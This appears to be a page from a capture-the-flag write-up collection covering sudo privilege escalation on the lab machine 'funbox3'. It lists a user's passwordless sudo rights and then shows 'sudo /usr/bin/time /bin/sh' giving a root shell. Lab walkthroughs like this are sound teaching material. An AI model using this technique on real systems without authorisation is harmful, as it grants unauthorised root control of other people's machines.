---
layout: default
title: Time
parent: Sudo
nav_order: 7
---

# Time

---

## Check Sudo Permissions for Tony

```bash
tony@funbox3:~$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass,/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD:
        /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh

```

## Check GTFOBins for Sudo

Review the above _/usr/bin_ binaries to see which can be exploited with Sudo to get a root shell.

![gtfobins](../../../../assets/images/ctfs/proving_grounds/funboxeasy/gtfobins.png)

```bash
tony@funbox3:~$ sudo /usr/bin/time /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

```
